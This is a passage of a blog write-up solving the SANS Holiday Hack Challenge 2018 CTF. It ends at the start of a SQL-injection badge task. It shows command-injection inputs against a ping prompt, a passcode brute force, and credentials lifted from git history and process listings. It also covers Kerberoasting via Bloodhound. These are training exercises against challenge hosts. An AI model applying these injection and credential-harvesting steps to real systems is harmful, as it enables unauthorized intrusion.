<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,minimum-scale=1,maximum-scale=1"><link href=/css/fonts.css rel=stylesheet type=text/css><title>SANS Holiday Hack Challenge 2018 Solutions</title><link rel=stylesheet href=/css/hugo-octopress.css><link rel=stylesheet href=/css/fork-awesome.min.css><link href=https://parsiya.net/favicon.png rel=icon><meta name=description content><meta name=keywords content="[Parsia Hakimian Parsiya infosec information security]"><meta name=author content="Parsia"><meta name=generator content="Hugo 0.106.0"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image:src content="https://parsiya.net/blog/2019-01-15-sans-holiday-hack-challenge-2018-solutions/01-bloodhound.png"><meta name=twitter:title content="SANS Holiday Hack Challenge 2018 Solutions"><meta name=twitter:description content="SANS Holiday hack challenge 2018 was fun. It was also the first one I tried. I liked the talks and that the challenges were accessible to most skill levels. I mean RCE through the -0 bug in v8 is great and all but I want people to be able to have fun and learn new skills.
If being a security consultant has taught me anything, it's that no one has time to read your 100 page report. So here are some quick solutions. I will post my notes from the YouTube videos in different posts."><meta name=twitter:domain content="parsiya.net"><meta name=twitter:creator content="@CryptoGangsta"></head><body><header role=banner><hgroup><h1><a href=https://parsiya.net/>Hackerman's Hacking Tutorials</a></h1><h2>The knowledge of anything, since all things have causes, is not acquired or
complete unless it is known by its causes. - Avicenna</h2></hgroup></header><nav role=navigation><fieldset class=mobile-nav><select onchange="location=this.value"><option value>Navigate…</option><option value=https://parsiya.net/about/>» About Me!</option><option value=https://parsiya.net/cheatsheet/>» Cheat Sheet</option><option value=https://parsiya.io/>» My Clone</option><option value=https://github.com/parsiya/parsiya.net>» Source Repo</option><option value="https://queue.acm.org/detail.cfm?id=3197520">» Manual Work is a Bug</option><option value="https://www.google.com/search?q=andrew+ridgeley">» The Other Guy from Wham!</option></select></fieldset><ul class=main-navigation><li><a href=https://parsiya.net/about/ title="About Me!" target=_blank rel="noopener noreferrer">About Me!</a></li><li><a href=https://parsiya.net/cheatsheet/ title="Cheat Sheet" target=_blank rel="noopener noreferrer">Cheat Sheet</a></li><li><a href=https://parsiya.io/ title="My Clone" target=_blank rel="noopener noreferrer">My Clone</a></li><li><a href=https://github.com/parsiya/parsiya.net title="Source Repo" target=_blank rel="noopener noreferrer">Source Repo</a></li><li><a href="https://queue.acm.org/detail.cfm?id=3197520" title="Manual Work is a Bug" target=_blank rel="noopener noreferrer">Manual Work is a Bug</a></li><li><a href="https://www.google.com/search?q=andrew+ridgeley" title="The Other Guy from Wham!" target=_blank rel="noopener noreferrer">The Other Guy from Wham!</a></li></ul><ul class=subscription><a href=https://parsiya.net/index.xml target=_blank type=application/rss+xml title=RSS rel="noopener noreferrer"><i class="fa fa-rss-square fa-lg"></i></a></ul><form action=https://www.google.com/search method=get target=_blank rel="noopener noreferrer"><fieldset role=search><input class=search type=text name=q results=0 placeholder=Search>
<input type=hidden name=q value=site:https://parsiya.net/></fieldset></form></nav><div id=main><div id=content><div><article class=hentry role=article><header><p class=meta>Jan 15, 2019
- 21 minute read
- <a href=https://parsiya.net/blog/2019-01-15-sans-holiday-hack-challenge-2018-solutions/#disqus_thread>Comments</a>
- <a class=label href=https://parsiya.net/categories/writeup/>Writeup </a><a class=label href=https://parsiya.net/categories/crypto/>Crypto </a><a class=label href=https://parsiya.net/categories/reverse-engineering/>Reverse Engineering </a><a class=label href=https://parsiya.net/categories/holiday-hack/>Holiday Hack</a></p><h1 class=entry-title>SANS Holiday Hack Challenge 2018 Solutions</h1></header><div class=entry-content><nav id=TableOfContents><ul><li><a href=#1-orientation-challenge>1. Orientation Challenge</a><ul><li><a href=#essential-editor-skills>Essential Editor Skills</a></li></ul></li><li><a href=#2-directory-browsing>2. Directory Browsing</a><ul><li><a href=#the-name-game>The Name Game</a></li></ul></li><li><a href=#3-de-bruijn-sequences>3. de Bruijn Sequences</a><ul><li><a href=#door-passcode>Door Passcode</a></li><li><a href=#lethal-forensicelfication>Lethal ForensicELFication</a></li></ul></li><li><a href=#4-data-repo-analysis>4. Data Repo Analysis</a><ul><li><a href=#stall-mucking-report>Stall Mucking Report</a></li></ul></li><li><a href=#5-ad-privilege-discovery>5. AD Privilege Discovery</a><ul><li><a href=#curling-master>CURLing Master</a></li></ul></li><li><a href=#6-badge-manipulation>6. Badge Manipulation</a><ul><li><a href=#scan-o-matic>scan-o-matic</a><ul><li><a href=#payload>Payload</a></li></ul></li><li><a href=#yule-log-analysis>Yule Log Analysis</a></li></ul></li><li><a href=#7-hr-incident-response>7. HR Incident Response</a><ul><li><a href=#careers-website>Careers Website</a></li><li><a href=#dev-ops-fail>Dev Ops Fail</a></li></ul></li><li><a href=#8-network-traffic-forensics>8. Network Traffic Forensics</a><ul><li><a href=#appjs-analysis>app.js Analysis</a></li><li><a href=#sslkeylogfile>SSLKEYLOGFILE</a></li><li><a href=#python-escape-from-la>Python Escape from LA</a></li></ul></li><li><a href=#9-ransomware-recovery>9. Ransomware Recovery</a><ul><li><a href=#the-sleighball>The Sleighball</a><ul><li><a href=#more-analysis>More Analysis</a></li></ul></li><li><a href=#91-catch-the-malware>9.1 Catch the Malware</a></li><li><a href=#92-identify-the-domain>9.2 Identify the Domain</a><ul><li><a href=#dropper-analysis>Dropper Analysis</a></li></ul></li></ul></li><li><a href=#10-who-is-behind-it-all>10. Who Is Behind It All?</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav><p>SANS Holiday hack challenge 2018 was fun. It was also the first one I tried. I liked the talks and that the challenges were accessible to most skill levels. I mean <a href=https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/ target=_blank rel="noreferrer noopener">RCE through the -0 bug in v8 is great and all</a> but I want people to be able to have fun and learn new skills.</p><p>If being a security consultant has taught me anything, it's that no one has time to read your 100 page report. So here are some quick solutions. I will post my notes from the YouTube videos in different posts.</p><h1 id=1-orientation-challenge>1. Orientation Challenge
<a class=header-link href=#1-orientation-challenge><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p><strong>The answer is <code>Happy Trails</code>.</strong></p><p>Just Google keywords from the question and you get the answers.</p><ol><li>Wireless Adapter</li><li>ATNAS</li><li>Business Card</li><li>Cranberry Pi</li><li>Snowballs</li><li>The Great Book</li></ol><h2 id=essential-editor-skills>Essential Editor Skills
<a class=header-link href=#essential-editor-skills><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Need to exit Vim with <code>q!</code> or <code>wq!</code> or whatever.</p><hr><h1 id=2-directory-browsing>2. Directory Browsing
<a class=header-link href=#2-directory-browsing><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p><strong>The answer is <code>John McClane</code>.</strong></p><p>Go to the CFP website: <a href=https://cfp.kringlecastle.com/cfp/cfp.html target=_blank rel="noreferrer noopener">https://cfp.kringlecastle.com/cfp/cfp.html</a>.</p><p>Navigate to <a href=https://cfp.kringlecastle.com/cfp/ target=_blank rel="noreferrer noopener">https://cfp.kringlecastle.com/cfp/</a> to see the directory listing.</p><pre tabindex=0><code>../
cfp.html                                           08-Dec-2018 13:19                3391
rejected-talks.csv                                 08-Dec-2018 13:19               30677
</code></pre><p>Download <code>rejected-talks.csv</code> and search for the name of the talk.</p><pre tabindex=0><code>qmt3,2,8040424,200,FALSE,FALSE,John,McClane,Director of Security,
    Data Loss for Rainbow Teams: A Path in the Darkness,1,11
</code></pre><h2 id=the-name-game>The Name Game
<a class=header-link href=#the-name-game><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p><strong>The answer is <code>Scott</code>.</strong></p><p>Using option 2, it asks for a server address to <code>ping</code>. It's vulnerable to command injection. We can pass commands after <code>;</code>.</p><p>For example, passing <code>;ls</code>:</p><pre tabindex=0><code>Validating data store for employee onboard information.
Enter address of server: ;ls
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
menu.ps1  onboard.db  runtoanswer
onboard.db: SQLite 3.x database
</code></pre><p>We can see the vulnerable code inside <code>menu.ps1</code> for option 2.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>cls
</span></span></span><span style=display:flex><span><span style=color:#b58900>Write-Host</span> <span style=color:#2aa198>&#34;Validating data store for employee onboard information.&#34;</span>
</span></span><span style=display:flex><span><span style=color:#268bd2>$server</span> = <span style=color:#b58900>Read-Host</span> <span style=color:#2aa198>&#39;Enter address of server&#39;</span>
</span></span><span style=display:flex><span>/bin/bash -c <span style=color:#2aa198>&#34;/bin/ping -c 3 $server&#34;</span>
</span></span><span style=display:flex><span>/bin/bash -c <span style=color:#2aa198>&#34;/usr/bin/file onboard.db&#34;</span>
</span></span></code></pre></div><ol><li>Inject <code>;sqlite3</code> to be dropped into the sqlite prompt.</li><li><code>.open onboard.db</code> to open the db file</li><li><code>.dump</code> to get everything.</li><li>Search for <code>chan</code>.</li></ol><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#719e07>INSERT</span> <span style=color:#719e07>INTO</span> <span style=color:#2aa198>&#34;onboard&#34;</span> <span style=color:#719e07>VALUES</span>(<span style=color:#2aa198>84</span>,<span style=color:#2aa198>&#39;Scott&#39;</span>,<span style=color:#2aa198>&#39;Chan&#39;</span>,<span style=color:#2aa198>&#39;48 Colorado Way&#39;</span>,<span style=color:#719e07>NULL</span>,
</span></span><span style=display:flex><span>    <span style=color:#2aa198>&#39;Los Angeles&#39;</span>,<span style=color:#2aa198>&#39;90067&#39;</span>,<span style=color:#2aa198>&#39;4017533509&#39;</span>,<span style=color:#2aa198>&#39;scottmchan90067@gmail.com&#39;</span>);
</span></span></code></pre></div><hr><h1 id=3-de-bruijn-sequences>3. de Bruijn Sequences
<a class=header-link href=#3-de-bruijn-sequences><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p><strong>Morcel says <code>Welcome unprepared speaker!</code>.</strong></p><h2 id=door-passcode>Door Passcode
<a class=header-link href=#door-passcode><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p><strong>Pass code is <code>0120</code>.</strong></p><p>Proxy the requests with Burp or open up the browser's console as you enter a passcode. Symbols correspond with <code>0123</code>.</p><p>The passcode is sent to the server in a POST request like this:</p><ul><li><a href="https://doorpasscode.kringlecastle.com/checkpass.php?i=0123" target=_blank rel="noreferrer noopener">https://doorpasscode.kringlecastle.com/checkpass.php?i=0123</a></li></ul><p>If passcode was wrong, we get:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#268bd2>&#34;success&#34;</span>:<span style=color:#cb4b16>false</span>,<span style=color:#268bd2>&#34;message&#34;</span>:<span style=color:#2aa198>&#34;Incorrect guess.&#34;</span>}
</span></span></code></pre></div><p>There are 256 possible combination. Four place holders with four options, four to the power of four. No need to do anything other than bruteforce. With Burp Intruder (even the free edition's throttled Intruder), it's only a few minutes. Or we can write our own script in <del>Python</del> Go.</p><p>Passcode is <code>0120</code> and good response is:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#268bd2>&#34;success&#34;</span>:<span style=color:#cb4b16>true</span>,<span style=color:#268bd2>&#34;resourceId&#34;</span>:<span style=color:#2aa198>&#34;undefined&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;hash&#34;</span>:<span style=color:#2aa198>&#34;0273f6448d56b3aba69af76f99bdc741268244b7a187c18f855c6302ec93b703&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;message&#34;</span>:<span style=color:#2aa198>&#34;Correct guess!&#34;</span>}
</span></span></code></pre></div><p>The hash appears to be an HMAC of <code>resourceId</code>. Can we trick the client into opening the door by supplying our own? If it's an HMAC, the secret must be in the browser. I did not look into it.</p><span class=caption-wrapper><img class=caption src=03-door-passcode.png title="Door passcode bruteforce in Burp Intruder" alt="Door passcode bruteforce in Burp Intruder">
<span class=caption-text>Door passcode bruteforce in Burp Intruder</span></span><h2 id=lethal-forensicelfication>Lethal ForensicELFication
<a class=header-link href=#lethal-forensicelfication><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p><strong>The answer is <code>Elinore</code>.</strong></p><p>Vim leaves files behind.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-s data-lang=s><span style=display:flex><span><span style=color:#719e07>$</span> ls <span style=color:#719e07>-</span>alt
</span></span><span style=display:flex><span>total <span style=color:#2aa198>5460</span>
</span></span><span style=display:flex><span><span style=color:#719e07>-</span>rw<span style=color:#719e07>-</span>r<span style=color:#719e07>--</span>r<span style=color:#719e07>--</span> <span style=color:#2aa198>1</span> elf  elf     <span style=color:#2aa198>5063</span> Dec <span style=color:#2aa198>14</span> <span style=color:#2aa198>16</span><span style=color:#719e07>:</span><span style=color:#2aa198>13</span> .viminfo
</span></span></code></pre></div><p><code>cat .viminfo</code></p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ cat .viminfo 
</span></span><span style=display:flex><span><span style=color:#586e75># This viminfo file was generated by Vim 8.0.</span>
</span></span><span style=display:flex><span><span style=color:#586e75># You may edit it if you&#39;re careful!</span>
</span></span><span style=display:flex><span><span style=color:#586e75># Viminfo version</span>
</span></span><span style=display:flex><span>|1,4
</span></span><span style=display:flex><span><span style=color:#586e75># Value of &#39;encoding&#39; when this file was written</span>
</span></span><span style=display:flex><span>*encoding<span style=color:#719e07>=</span>utf-8
</span></span><span style=display:flex><span><span style=color:#586e75># hlsearch on (H) or off (h):</span>
</span></span><span style=display:flex><span>~h
</span></span><span style=display:flex><span><span style=color:#586e75># Last Substitute Search Pattern:</span>
</span></span><span style=display:flex><span>~MSle0~&amp;Elinore
</span></span><span style=display:flex><span><span style=color:#586e75># Last Substitute String:</span>
</span></span><span style=display:flex><span><span style=color:#268bd2>$NEVERMORE</span>
</span></span><span style=display:flex><span><span style=color:#586e75># Command Line History (newest to oldest):</span>
</span></span><span style=display:flex><span>:wq
</span></span><span style=display:flex><span>|2,0,1536607231,,<span style=color:#2aa198>&#34;wq&#34;</span>
</span></span><span style=display:flex><span>:%s/Elinore/NEVERMORE/g
</span></span><span style=display:flex><span>|2,0,1536607217,,<span style=color:#2aa198>&#34;%s/Elinore/NEVERMORE/g&#34;</span>
</span></span><span style=display:flex><span>:r .secrets/her/poem.txt
</span></span><span style=display:flex><span>|2,0,1536607201,,<span style=color:#2aa198>&#34;r .secrets/her/poem.txt&#34;</span>
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>File containing the poem is at <code>/.secrets/her/poem.txt</code>. But the answer is obvious from the substitution. It's <code>Elinore</code>.</p><hr><h1 id=4-data-repo-analysis>4. Data Repo Analysis
<a class=header-link href=#4-data-repo-analysis><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p><strong>The answer is <code>Yippee-ki-yay</code>.</strong></p><p>git repo is at <a href=https://git.kringlecastle.com/Upatree/santas_castle_automation target=_blank rel="noreferrer noopener">https://git.kringlecastle.com/Upatree/santas_castle_automation</a>.</p><p>Look at the commits in the web interface. There's a commit named <code>removing accidental commit</code>.</p><p>A file was removed that had the password:</p><pre tabindex=0><code>Hopefully this is the last time we have to change our password again until next Christmas. 
Password = &#39;Yippee-ki-yay&#39;
Change ID = &#39;9ed54617547cfca783e0f81f8dc5c927e3d1e3&#39;
</code></pre><p>The password allows us to open another file in the repository:</p><ul><li><code>santas_castle_automation/schematics/ventilation_diagram.zip</code>:</li></ul><p><strong>This file contains the plans for Google Ventilation near the Google booth in the castle lobby. Using the map allows you to bypass a number of challenges and directly go to Santa's secret room.</strong></p><span class=caption-wrapper><img class=caption src=04-vent-f1.jpg title="Google ventilation floor 1" alt="Google ventilation floor 1">
<span class=caption-text>Google ventilation floor 1</span></span>
<span class=caption-wrapper><img class=caption src=05-vent-f2.jpg title="Google ventilation floor 2" alt="Google ventilation floor 2">
<span class=caption-text>Google ventilation floor 2</span></span><h2 id=stall-mucking-report>Stall Mucking Report
<a class=header-link href=#stall-mucking-report><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p><strong>Answer is</strong></p><ul><li><code>smbclient //localhost/report-upload/ directreindeerflatterystable -U report-upload -c "put report.txt"</code></li></ul><p>The challenge hint talks about credentials in commands. We can see the complete output of ps with <code>ps auxww</code>. Remember that <code>ps aux</code> has truncated output.</p><pre tabindex=0><code>$ ps auxww
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root        10  0.0  0.0  49532  3212 pts/0    S    19:38   0:00 sudo -u manager /home/man
ager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argumen
t --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppr
ess --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
</code></pre><p><code>samba-wrapper.sh</code> appears to be a wrapper for <code>smbclient</code>. We can figure out the parameters from the command above. We need to upload the report as user <code>report-upload</code> with password <code>directreindeerflatterystable</code> (apparently the equivalent of XKCD <code>correct horse battery staple</code>).</p><p>Command is:</p><p><code>smbclient //localhost/report-upload/ directreindeerflatterystable -U report-upload -c "put report.txt"</code></p><hr><h1 id=5-ad-privilege-discovery>5. AD Privilege Discovery
<a class=header-link href=#5-ad-privilege-discovery><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p><strong>The answer is <code>LDUBEJ00320@AD.KRINGLECASTLE.COM</code>.</strong></p><p>The image needs to be set to <code>64-bit</code> Ubuntu or Debian to work on VirtualBox (it's set to <code>32-bit</code> after importing the ova).</p><p>The VM image is at:</p><ul><li><a href=https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova target=_blank rel="noreferrer noopener">https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova</a></li></ul><p>A shortcut to the tool Bloodhound is on the desktop. There's a built-in query for getting to domain admin from Kerberoastable accounts.</p><p>There are three accounts but two need RDP which is mentioned in the hints.</p><span class=caption-wrapper><img class=caption src=01-bloodhound.png title="Bloodhound Builtin Query" alt="Bloodhound Builtin Query">
<span class=caption-text>Bloodhound Builtin Query</span></span><h2 id=curling-master>CURLing Master
<a class=header-link href=#curling-master><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p><strong>Answer is:</strong></p><ul><li><code>curl -d "status=on" -X POST http://localhost:8080/index.php --http2-prior-knowledge</code></li></ul><p>Supposedly the trigger to start the "Candy Striper" is an "arcane HTTP/2 call."</p><p>Partial contents of <code>/etc/nginx/nginx.conf</code> show the web server only has HTTP/2 enabled.</p><pre tabindex=0><code>$ cat /etc/nginx/nginx.conf 
...
http {
...
    server {
    # love using the new stuff! -Bushy
            listen                  8080 http2;
            # server_name           localhost 127.0.0.1;
            root /var/www/html;
}
</code></pre><p>Looking at command history (use the <code>up</code> arrow key), we get some commands including this:</p><ul><li><code>curl --http2-prior-knowledge http://localhost:8080/index.php</code></li></ul><p>Running the command returns:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#268bd2>html</span>&gt;
</span></span><span style=display:flex><span> &lt;<span style=color:#268bd2>head</span>&gt;
</span></span><span style=display:flex><span>  &lt;<span style=color:#268bd2>title</span>&gt;Candy Striper Turner-On&#39;er&lt;/<span style=color:#268bd2>title</span>&gt;
</span></span><span style=display:flex><span> &lt;/<span style=color:#268bd2>head</span>&gt;
</span></span><span style=display:flex><span> &lt;<span style=color:#268bd2>body</span>&gt;
</span></span><span style=display:flex><span> &lt;<span style=color:#268bd2>p</span>&gt;To turn the machine on, simply POST to this URL with parameter &#34;status=on&#34;
</span></span><span style=display:flex><span> &lt;/<span style=color:#268bd2>body</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>html</span>&gt;
</span></span></code></pre></div><p>We can send this:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>$ curl -d &#34;status=on&#34; -X POST http://localhost:8080/index.php --http2-prior-knowledge
</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>html</span>&gt;
</span></span><span style=display:flex><span> &lt;<span style=color:#268bd2>head</span>&gt;
</span></span><span style=display:flex><span>  &lt;<span style=color:#268bd2>title</span>&gt;Candy Striper Turner-On&#39;er&lt;/<span style=color:#268bd2>title</span>&gt;
</span></span><span style=display:flex><span> &lt;/<span style=color:#268bd2>head</span>&gt;
</span></span><span style=display:flex><span> &lt;<span style=color:#268bd2>body</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>p</span>&gt;To turn the machine on, simply POST to this URL with parameter &#34;status=on&#34;
</span></span><span style=display:flex><span>    <span style=color:#586e75>&lt;!-- removed --&gt;</span>
</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>p</span>&gt;Congratulations! You&#39;ve won and have successfully completed this challenge.
</span></span><span style=display:flex><span>    &lt;<span style=color:#268bd2>p</span>&gt;POSTing data in HTTP/2.0.
</span></span><span style=display:flex><span> &lt;/<span style=color:#268bd2>body</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>html</span>&gt;
</span></span></code></pre></div><hr><h1 id=6-badge-manipulation>6. Badge Manipulation
<a class=header-link href=#6-badge-manipulation><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p><strong>The answer is <code>19880715</code>.</strong></p><h2 id=scan-o-matic>scan-o-matic
<a class=header-link href=#scan-o-matic><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>To get into the room we need to upload a QR code with the payload to do SQLi.</p><p>The request looks like:</p><pre tabindex=0><code>POST /upload HTTP/1.1
Host: scanomatic.kringlecastle.com

b64barcode=[payload]
